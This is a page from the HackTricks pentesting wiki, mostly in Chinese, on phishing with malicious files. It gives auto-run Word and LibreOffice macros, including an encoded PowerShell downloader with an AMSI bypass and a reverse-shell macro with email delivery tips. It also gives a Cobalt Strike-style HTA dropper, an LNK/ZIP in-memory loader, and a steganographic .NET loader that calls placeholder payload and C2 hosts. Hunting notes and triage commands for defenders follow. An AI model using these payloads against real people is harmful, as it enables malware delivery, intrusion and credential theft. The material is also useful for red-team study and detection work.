# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word 在打开文件前会执行文件数据验证。数据验证以数据结构识别的形式进行，并依据 OfficeOpenXML 标准。如果在数据结构识别过程中发生任何错误，则不会打开正在分析的文件。

通常，包含 macros 的 Word 文件使用 `.docm` 扩展名。但是，也可以通过更改文件扩展名来重命名文件，同时保留其执行 macros 的能力。\
例如，RTF 文件在设计上不支持 macros，但将 DOCM 文件重命名为 RTF 后，Microsoft Word 仍会处理该文件，并且该文件能够执行 macros。\
相同的内部结构和机制适用于 Microsoft Office Suite 中的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令检查某些 Office 程序将执行哪些扩展名：
```bash
assoc | findstr /i "word excel powerp"
```
引用远程模板的 DOCX 文件（File –Options –Add-ins –Manage: Templates –Go）如果该模板包含 macros，也可以“执行” macros。

### External Image Load

转到：_Insert --> Quick Parts --> Field_\
_**Categories**: Links and References，**Filed names**: includePicture，以及 **Filename or URL**：_ http://<ip>/whatever

![Office Documents - External Image Load: 转到：Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

可以使用 macros 从文档中运行任意代码。

#### Autoload functions

它们越常见，AV 检测到它们的可能性就越高。

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手动移除 metadata

转到 **File > Info > Inspect Document > Inspect Document**，这将打开 Document Inspector。点击 **Inspect**，然后在 **Document Properties and Personal Information** 旁点击 **Remove All**。

#### Doc Extension

完成后，选择 **Save as type** 下拉菜单，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**。\
这样做是因为你**无法在 `.docx` 中保存 macro**，并且启用 macro 的 **`.docm`** 扩展名存在**污名**（例如，缩略图图标带有一个巨大的 `!`，而且某些 web/email gateway 会完全阻止它们）。因此，这个**旧版 `.doc` 扩展名是最佳折中方案**。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer 文档可以嵌入 Basic macros，并通过将 macro 绑定到 **Open Document** event（Tools → Customize → Events → Open Document → Macro…），在文件打开时自动执行它们。<sup>[[1]](#references)</sup>一个简单的 reverse shell macro 如下：
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
注意字符串中的双引号（`""`）——LibreOffice Basic 使用它们来转义字面量引号，因此以 `...==""")` 结尾的 payload 能保持内部命令和 Shell 参数的引号配对。

交付提示：

- 保存为 `.odt`，并将 macro 绑定到文档事件，以便文档打开时立即触发。
- 使用 `swaks` 发送邮件时，请使用 `--attach @resume.odt`（必须包含 `@`，这样发送的才是文件内容，而不是作为附件发送的文件名字符串）。当滥用接受任意 `RCPT TO` 收件人且不进行验证的 SMTP servers 时，这一点至关重要。

## HTA 文件

HTA 是一种 Windows 程序，它**结合了 HTML 和 scripting languages（例如 VBScript 和 JScript）**。它生成用户界面，并作为一个“完全受信任”的应用程序执行，不受浏览器安全模型的限制。

HTA 使用 **`mshta.exe`** 执行，而该程序通常会随 **Internet Explorer** 一起**安装**，这使得 **`mshta` 依赖于 IE**。因此，如果 Internet Explorer 已被卸载，HTA 将无法执行。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

有多种方式可以**远程强制 NTLM authentication**，例如，可以在用户将访问的电子邮件或 HTML 中添加**不可见图像**（甚至 HTTP MitM？）。或者向受害者发送**文件地址**，使其仅仅**打开文件夹**就会**触发**一次**authentication**。

**在以下页面中查看这些思路及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

不要忘记，你不仅可以窃取 hash 或 authentication，还可以**执行 NTLM relay attacks**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads（fileless chain）

高效的 campaign 会投递一个 ZIP，其中包含两个合法的诱饵文档（PDF/DOCX）和一个恶意 .lnk。其诀窍在于，实际的 PowerShell loader 存储在 ZIP 的 raw bytes 中、某个唯一 marker 之后，而 .lnk 会提取该内容并完全在内存中运行它。<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner 实现的典型流程：

1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData% 以及当前 working directory 的父目录。
2) 读取 ZIP bytes 并查找 hardcoded marker（例如 xFIQCV）。marker 之后的所有内容都是嵌入的 PowerShell payload。
3) 将 ZIP 复制到 %ProgramData%，在那里解压，然后打开诱饵 .docx 以表现得像正常文件。
4) 为当前 process 绕过 AMSI：`[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true`
5) Deobfuscate 下一阶段（例如移除所有 `#` 字符），并在内存中执行。

用于提取并运行嵌入 stage 的 PowerShell skeleton 示例：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically.<sup>[[2]](#references)[[4]](#references)</sup> See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Another recurring pattern is a **冒充文档的 `.lnk`**，它会立即打开一个 benign lure，同时在后台部署真正的攻击链。<sup>[[3]](#references)</sup>

Observed workflow:
1. 快捷方式**伪装成 PDF**，并使用 `conhost.exe` 或类似的 proxy 来启动经过混淆的 PowerShell downloader。
2. PowerShell 通过拆分明显的 token（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`），使得查找 `iwr`、`gci`、`ren`、`cpi` 或 `schtasks` 的简单检测无法发现该命令。
3. Stager 首先下载 **decoy document**，为受害者打开该文档，然后在后台重建恶意文件。
4. Payload 可能会使用**无意义的扩展名**写入文件，之后通过去除填充字符进行重命名，从而延迟明显 `.exe` / `.cpl` artifact 的出现。
5. 通过**基于分钟的 scheduled task**建立 persistence，从用户可写路径启动受信任的 host binary。

Minimal hunting clues from this pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
一个值得识别的 staging 布局是：
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 或 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 为什么第二阶段具有隐蔽性

在 Rapid7 案例研究中，scheduled task 会从 `C:\Users\Public\` 反复启动 **`Fondue.exe`**。由于 **`APPWIZ.cpl`** 被 staging 在其旁边，并导出了 **`RunFODW`**，这个受信任的 Microsoft binary 会 side-load attacker CPL，而不是使用系统中的合法副本。

随后，CPL 会：
- 从 `C:\Windows\Tasks\editor.dat` 读取 **AES-256-CBC** blob
- 通过 **Windows CNG / `bcrypt.dll`** 对其解密
- 分配可执行内存，并复制解密后的 shellcode
- 将 shellcode 指针作为 **`EnumUILanguagesW`** 的 callback，间接执行它

最后一步值得单独进行 hunting：malware 通常会避免直接执行 `((void(*)())buf)()` 跳转，而是滥用一个接受 callback 的**合法 WinAPI** 来转移执行流。

该 campaign 中解密出的 payload 是 **Donut** shellcode。随后，它会完全在内存中映射最终 PE，并在当前进程中 patch **AMSI/WLDP/ETW**，然后移交执行。有关 side-loading 和驻留内存的 post-processing 的更深入笔记，请参阅：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

实用的 hunting 切入点：
- `.lnk` 启动 `powershell.exe` 或 `conhost.exe`，随后显示 decoy 文档。
- 短暂下载至 **`C:\Users\Public\`**，随后立即将文件从无意义的扩展名重命名。
- 使用 `GoogleErrorReport` 等普通名称、从**用户可写目录**执行的 scheduled tasks。
- 受信任的 binaries 从同一个非系统目录加载 **`.cpl` / `.dll`** 文件。
- 写入 **`C:\Windows\Tasks\`** 下的 Base64 文本 blobs，随后由 side-loaded module 读取。

## 图像中由隐写术分隔的 payload（PowerShell stager）

近期的 loader chain 会传递经过 obfuscation 的 JavaScript/VBS，解码并运行一个 Base64 PowerShell stager。该 stager 会下载一张图像（通常为 GIF），其中以纯文本形式隐藏了一个 Base64-encoded .NET DLL，内容位于唯一的起始/结束 marker 之间。脚本会搜索这些 delimiter（在实际攻击中见过的示例：«<<sudo_png>> … <<sudo_odt>>>»），提取其中的文本，将其 Base64-decode 为 bytes，在内存中加载 assembly，并使用 C2 URL 调用一个已知的 entry method。<sup>[[5]](#references)</sup>

工作流程
- Stage 1：Archived JS/VBS dropper → 解码嵌入的 Base64 → 使用 `-nop -w hidden -ep bypass` 启动 PowerShell stager。
- Stage 2：PowerShell stager → 下载图像，提取 marker-delimited Base64，在内存中加载 .NET DLL，并调用其 method（例如 VAI），传入 C2 URL 和 options。
- Stage 3：Loader 获取最终 payload，通常通过 process hollowing 将其注入受信任的 binary（通常为 MSBuild.exe）。<sup>[[7]](#references)[[8]](#references)</sup> 有关 process hollowing 和 trusted utility proxy execution 的更多信息，请参阅：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

从图像中提取 DLL 并在内存中调用 .NET method 的 PowerShell 示例：

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

注意事项
- 这是 ATT&CK T1027.003（steganography/marker-hiding）。<sup>[[6]](#references)</sup> 不同 campaign 使用的标记有所不同。
- 在加载 assembly 之前，通常会先执行 AMSI/ETW bypass 和字符串反混淆。
- Hunting：扫描下载的图像中是否存在已知分隔符；识别 PowerShell 访问图像并立即解码 Base64 blob 的行为。

另请参阅 stego tools 和 carving techniques：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

一种反复出现的初始阶段，是在 archive 中投递一个经过高度混淆的小型 `.js` 或 `.vbs` 文件。它唯一的目的，是解码嵌入的 Base64 字符串，并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，通过 HTTPS 引导下一阶段。<sup>[[5]](#references)</sup>

逻辑骨架（抽象）：
- 读取自身文件内容
- 在垃圾字符串之间定位 Base64 blob
- 将其解码为 ASCII PowerShell
- 使用 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行

Hunting 线索
- Archive 中的 JS/VBS 附件在命令行中使用 `-enc`/`FromBase64String` 启动 `powershell.exe`。
- `wscript.exe` 从用户临时路径启动 `powershell.exe -nop -w hidden`。

## 将 MSC documents 作为执行容器（GrimResource）

Microsoft Management Console 文件（`.msc`）是通常由 `mmc.exe` 打开的 XML console definitions。**GrimResource** weaponizes 一个指向包含旧 XSS primitive 的 `apds.dll` resource 的 `StringTable` reference，因此用户打开 crafted console 时，会导致 JavaScript 在 `mmc.exe` 内运行。已观察到的 samples 将基于 `transformNode` 的混淆与 **DotNetToJScript** 结合起来，在不经过常见 Office-macro 路径的情况下实例化 .NET payload。<sup>[[9]](#references)</sup>

对于静态 triage，应将不受信任的 MSC 视为文本，**不要双击它**：<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
高信号运行时 pivot 包括：`mmc.exe` 加载 CLR 或 script 组件、创建网络连接，或启动 `powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe`，或其他异常可执行文件。这种格式本身是合法的，因此检测应关联 **来源 + 可疑 XML/script 内容 + `mmc.exe` 行为**，而不是阻止所有 MSC 文件。<sup>[[9]](#references)</sup>

## PDF/QR 重定向器和 payload gating

PDF 不需要 exploit 也能发挥作用。近期 campaigns 会在看似良性的文档中放置**QR code 或普通链接**，将 browser session 引导离开邮件控制范围，并使用收件人地址个性化目标页面。Microsoft 记录了 2025 年的 PDF campaigns：其中的 QR URL 对每个收件人都唯一，并指向 RaccoonO365 credential-harvesting infrastructure；另一条 parallel chain 则使用 IP/environment gating，向选定的访问者返回 JavaScript/MSI 路径，而向 scanners 或不允许的 clients 返回 benign PDF。<sup>[[10]](#references)</sup>

对 PDF actions 和渲染后的 QR codes 都进行 triage。QR 可能是以 vector 绘制的，而不是作为可提取的 image 存储，因此除了提取 embedded images 外，还要将每一页 rasterize：
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
检查来自隔离分析系统的已解码目标地址和重定向，无需进行身份验证。实用的 hunting 特征包括：正文几乎为空且仅包含 QR 的 PDF、嵌入查询参数中的收件人 email、经过多个信誉良好的 hosting 服务的重定向，以及根据 IP、地理位置、cookies、referrer 或 user agent 返回不同内容。使用受控配置文件比较请求，因为单次 sandbox 获取可能只会收到诱饵内容。<sup>[[10]](#references)</sup>

## 用于窃取 NTLM 哈希的 Windows 文件

查看关于 **窃取 NTLM creds 的位置** 的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign：针对美国公司的复杂 Phishing 攻击](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode：通过以中国为主题的 loader 链追踪 Dropping Elephant 的 tradecraft](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 新型 COM persistence 技术（CICADA8）](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader 交付多种 infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography（T1027.003）](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing（T1055.012）](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution：MSBuild（T1127.001）](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：用于 initial access 和 evasion 的 Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors 利用 tax season 部署以税务为主题的 phishing campaigns](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
